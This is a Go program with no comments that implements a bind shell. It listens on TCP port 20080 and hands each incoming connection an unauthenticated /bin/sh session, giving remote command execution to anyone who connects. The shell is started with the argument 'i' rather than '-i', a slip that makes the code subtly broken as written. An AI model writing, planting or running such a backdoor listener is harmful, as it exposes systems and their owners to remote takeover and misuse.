package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handler(conn net.Conn){
	cmd := exec.Command("/bin/sh", "i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listner, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listner.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handler(conn)
	}
}
